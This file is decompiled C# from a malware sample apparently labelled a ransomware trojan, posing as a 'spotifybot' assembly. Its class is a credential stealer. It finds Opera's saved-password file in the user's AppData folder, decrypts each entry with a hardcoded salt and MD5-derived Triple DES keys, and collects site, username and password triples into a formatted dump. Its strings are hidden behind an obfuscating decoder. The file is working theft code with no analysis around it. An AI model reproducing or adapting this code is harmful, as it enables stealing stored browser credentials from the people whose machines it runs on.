// Decompiled with JetBrains decompiler
// Type: DAOpera
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class DAOpera
{
  public class Operaz
  {
    public static byte[] YSCJG = new byte[11]
    {
      (byte) 131,
      (byte) 125,
      (byte) 252,
      (byte) 15,
      (byte) 142,
      (byte) 179,
      (byte) 232,
      (byte) 105,
      (byte) 115,
      (byte) 175,
      byte.MaxValue
    };
    public static byte[] QSWP = new byte[4]
    {
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 8
    };
    public static string VHET = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    public static string CUED;
    public static int c = 0;
    public static int c1 = 0;
    public static int c2 = 0;
    public static bool JHCR = true;
    public static string ReturnValue;
    public static string XYRR;
    public static string KJQV;
    public static string YQXS;
    public static string[] HDSM = new string[1001];
    public static string[] FFGT = new string[1001];
    public static string[] XHGC = new string[1001];
    public static int MMIB = 0;
    public static bool BMXT = false;
    public static string[] Lines;
    public static string[] HOVD = new string[3001];

    public static string FPQX()
    {
      List<string> stringList = new List<string>();
      string str1 = DAOpera.Operaz.GLKS();
      try
      {
        string str2 = str1;
        int index = 0;
        int length = str2.Length;
        while (index < length)
        {
          string Left = Conversions.ToString(str2[index]);
          if (Operators.CompareString(Left, "", false) != 0)
            stringList.Add(Left);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        if (stringList.Count == 0)
        {
          RUDUUFDP.CPMXFIPG("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("P4ezr65+WKizsIWdtWqfjK2vrlyLp7dqnoJYta+fjK6ovKGBZGO5rj2sq69ckquovFyBoadqqoysY7Kdk51jmayCqqRqpYurt6uoiZ2neC0=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
        }
        else
        {
          int num = checked (stringList.Count - 1);
          int index = 0;
          while (index <= num)
          {
            stringBuilder.Append(RUDUUFDP.CPMXFIPG("jM7d5Z1kAw==", "False") + stringList[index].Substring(1)).AppendLine();
            stringBuilder.Append(RUDUUFDP.CPMXFIPG("kcrH23uKuM/OlVwL", "False") + stringList[checked (index + 1)].Substring(1)).AppendLine();
            stringBuilder.Append(RUDUUFDP.CPMXFIPG("j7vY39WuzMmmfgc=", "False") + stringList[checked (index + 2)].Substring(1)).AppendLine();
            stringBuilder.Append(RUDUUFDP.CPMXFIPG("YXyHjoBhfIeOgGF8h46AYXyHjoBhfIeOgGF8h46AYXwk", "False")).AppendLine();
            checked { index += 3; }
          }
          JNXOYT.IQEWE = RUDUUFDP.CPMXFIPG("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + stringBuilder.ToString() + Environment.NewLine + RUDUUFDP.CPMXFIPG("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string str3;
      return str3;
    }

    public static string GLKS()
    {
      try
      {
        if (File.Exists(DAOpera.Operaz.VHET + RUDUUFDP.CPMXFIPG("hZO/u7qKoJ7GrZulq82pl6h9uqmdHg==", "False")))
        {
          DAOpera.Operaz.VHET += RUDUUFDP.CPMXFIPG("coCsqKd3jYuzmoiSmLqWhJVqp5aKMQ==", "False");
          DAOpera.Operaz.TMEJ();
        }
        else if (File.Exists(DAOpera.Operaz.VHET + RUDUUFDP.CPMXFIPG("f425tbSEmpjAp5WfpcC0kqSyvKd/taq+plGiqsQn", "False")))
        {
          DAOpera.Operaz.VHET += RUDUUFDP.CPMXFIPG("jZvHw8KSqKbOtaOts87CoLLAyrWNw7jMtF+wuNIZ", "False");
          DAOpera.Operaz.TMEJ();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string str;
      return str;
    }

    public static void TMEJ()
    {
      try
      {
        byte[] sourceArray = File.ReadAllBytes(DAOpera.Operaz.VHET);
        int num1 = checked (sourceArray.Length - 5);
        int index1 = 0;
        while (index1 <= num1)
        {
          if (sourceArray[index1] == (byte) 0 && sourceArray[checked (index1 + 1)] == (byte) 0 && sourceArray[checked (index1 + 2)] == (byte) 0 && sourceArray[checked (index1 + 3)] == (byte) 8)
          {
            int num2 = (int) sourceArray[checked (index1 + 15)];
            byte[] numArray1 = new byte[8];
            byte[] numArray2 = new byte[checked (num2 - 1 + 1)];
            Array.Copy((Array) sourceArray, checked (index1 + 4), (Array) numArray1, 0, numArray1.Length);
            Array.Copy((Array) sourceArray, checked (index1 + 16), (Array) numArray2, 0, numArray2.Length);
            DAOpera.Operaz.CUED = DAOpera.Operaz.CUED + DAOpera.Operaz.OEJK(numArray1, numArray2) + Environment.NewLine;
            checked { index1 += 11 + num2; }
          }
          checked { ++index1; }
        }
        DAOpera.Operaz.Lines = DAOpera.Operaz.CUED.Split(Conversions.ToChar(Environment.NewLine));
        int index2 = 0;
        do
        {
          DAOpera.Operaz.Lines[index2] = (string) null;
          checked { ++index2; }
        }
        while (index2 <= 3);
        int num3 = checked (DAOpera.Operaz.Lines.Length - 1);
        int index3 = 0;
        while (index3 <= num3)
        {
          DAOpera.Operaz.XYRR = (string) null;
          DAOpera.Operaz.KJQV = (string) null;
          DAOpera.Operaz.YQXS = (string) null;
          DAOpera.Operaz.c = 0;
          if (DAOpera.Operaz.Lines[index3].Contains(RUDUUFDP.CPMXFIPG("rtXg4591kAI=", "False")) || DAOpera.Operaz.Lines[index3].Contains(RUDUUFDP.CPMXFIPG("kbjDxrtjc34g", "False")) || DAOpera.Operaz.Lines[index3].Contains(RUDUUFDP.CPMXFIPG("lb7Fln1eGA==", "False")))
          {
            if (index3 != 0)
            {
              int num4 = checked (DAOpera.Operaz.Lines[index3].Length - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                if (DAOpera.Operaz.Lines[index3][checked (num5 - DAOpera.Operaz.c)] > '\u007F')
                {
                  DAOpera.Operaz.Lines[index3] = DAOpera.Operaz.Lines[index3].Remove(checked (num5 - DAOpera.Operaz.c), 1);
                  checked { ++DAOpera.Operaz.c; }
                }
                checked { ++num5; }
              }
              if (checked (index3 - DAOpera.Operaz.MMIB) == 1)
                DAOpera.Operaz.XYRR = DAOpera.Operaz.Lines[index3];
              else if (checked (index3 - DAOpera.Operaz.MMIB) == 2)
                DAOpera.Operaz.XYRR = DAOpera.Operaz.Lines[index3];
              if (DAOpera.Operaz.Lines[index3].Contains(RUDUUFDP.CPMXFIPG("lb7Fln1eGA==", "False")))
                DAOpera.Operaz.XYRR = DAOpera.Operaz.Lines[index3];
              DAOpera.Operaz.MMIB = index3;
            }
          }
          else if (DAOpera.Operaz.BMXT)
          {
            if (checked (index3 - DAOpera.Operaz.MMIB) == 1 || checked (index3 - DAOpera.Operaz.MMIB) == 2)
            {
              int num6 = checked (DAOpera.Operaz.Lines[index3].Length - 1);
              int num7 = 0;
              while (num7 <= num6)
              {
                if (DAOpera.Operaz.Lines[index3][checked (num7 - DAOpera.Operaz.c)] > '\u007F')
                {
                  DAOpera.Operaz.Lines[index3] = DAOpera.Operaz.Lines[index3].Remove(checked (num7 - DAOpera.Operaz.c), 1);
                  checked { ++DAOpera.Operaz.c; }
                }
                checked { ++num7; }
              }
              if (checked (index3 - DAOpera.Operaz.MMIB) == 1)
                DAOpera.Operaz.KJQV = DAOpera.Operaz.Lines[index3];
              else if (checked (index3 - DAOpera.Operaz.MMIB) == 2)
              {
                DAOpera.Operaz.YQXS = DAOpera.Operaz.Lines[index3];
                checked { ++DAOpera.Operaz.c1; }
                DAOpera.Operaz.BMXT = false;
              }
            }
          }
          else if (DAOpera.Operaz.MMIB != 0 && (index3 == checked (DAOpera.Operaz.MMIB + 2) || index3 == checked (DAOpera.Operaz.MMIB + 4)))
          {
            int num8 = checked (DAOpera.Operaz.Lines[index3].Length - 1);
            int num9 = 0;
            while (num9 <= num8)
            {
              if (DAOpera.Operaz.Lines[index3][checked (num9 - DAOpera.Operaz.c)] > '\u007F')
              {
                DAOpera.Operaz.Lines[index3] = DAOpera.Operaz.Lines[index3].Remove(checked (num9 - DAOpera.Operaz.c), 1);
                checked { ++DAOpera.Operaz.c; }
              }
              checked { ++num9; }
            }
            if (index3 == checked (DAOpera.Operaz.MMIB + 2))
              DAOpera.Operaz.KJQV = DAOpera.Operaz.Lines[index3];
            else if (index3 == checked (DAOpera.Operaz.MMIB + 4))
            {
              DAOpera.Operaz.YQXS = DAOpera.Operaz.Lines[index3];
              checked { ++DAOpera.Operaz.c1; }
            }
          }
          if (Operators.CompareString(DAOpera.Operaz.XYRR, (string) null, false) != 0)
            DAOpera.Operaz.HDSM[DAOpera.Operaz.c1] = DAOpera.Operaz.XYRR;
          if (Operators.CompareString(DAOpera.Operaz.KJQV, (string) null, false) != 0)
            DAOpera.Operaz.FFGT[DAOpera.Operaz.c1] = DAOpera.Operaz.KJQV;
          if (Operators.CompareString(DAOpera.Operaz.YQXS, (string) null, false) != 0)
            DAOpera.Operaz.XHGC[checked (DAOpera.Operaz.c1 - 1)] = DAOpera.Operaz.YQXS;
          checked { ++index3; }
        }
        int num10 = checked (DAOpera.Operaz.HDSM.Length - 1);
        int index4 = 0;
        while (index4 <= num10 && Operators.CompareString(DAOpera.Operaz.HDSM[index4], "", false) != 0)
        {
          DAOpera.Operaz.HOVD[DAOpera.Operaz.c2] = DAOpera.Operaz.HDSM[index4];
          DAOpera.Operaz.HOVD[checked (DAOpera.Operaz.c2 + 1)] = DAOpera.Operaz.FFGT[index4];
          DAOpera.Operaz.HOVD[checked (DAOpera.Operaz.c2 + 2)] = DAOpera.Operaz.XHGC[index4];
          checked { DAOpera.Operaz.c2 += 3; }
          checked { ++index4; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string OEJK(byte[] key, byte[] CKRU)
    {
      string str;
      try
      {
        MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
        cryptoServiceProvider1.Initialize();
        byte[] numArray1 = new byte[checked (DAOpera.Operaz.YSCJG.Length + (key.Length - 1) + 1)];
        Array.Copy((Array) DAOpera.Operaz.YSCJG, (Array) numArray1, DAOpera.Operaz.YSCJG.Length);
        Array.Copy((Array) key, 0, (Array) numArray1, DAOpera.Operaz.YSCJG.Length, key.Length);
        byte[] hash1 = cryptoServiceProvider1.ComputeHash(numArray1);
        byte[] numArray2 = new byte[checked (hash1.Length + DAOpera.Operaz.YSCJG.Length + (key.Length - 1) + 1)];
        Array.Copy((Array) hash1, (Array) numArray2, hash1.Length);
        Array.Copy((Array) DAOpera.Operaz.YSCJG, 0, (Array) numArray2, hash1.Length, DAOpera.Operaz.YSCJG.Length);
        Array.Copy((Array) key, 0, (Array) numArray2, checked (hash1.Length + DAOpera.Operaz.YSCJG.Length), key.Length);
        byte[] hash2 = cryptoServiceProvider1.ComputeHash(numArray2);
        TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
        cryptoServiceProvider2.Mode = CipherMode.CBC;
        cryptoServiceProvider2.Padding = PaddingMode.None;
        byte[] destinationArray1 = new byte[24];
        byte[] destinationArray2 = new byte[8];
        Array.Copy((Array) hash1, (Array) destinationArray1, hash1.Length);
        Array.Copy((Array) hash2, 0, (Array) destinationArray1, hash1.Length, 8);
        Array.Copy((Array) hash2, 8, (Array) destinationArray2, 0, 8);
        key = destinationArray1;
        cryptoServiceProvider2.IV = destinationArray2;
        str = Encoding.Unicode.GetString(cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(CKRU, 0, CKRU.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }
  }
}
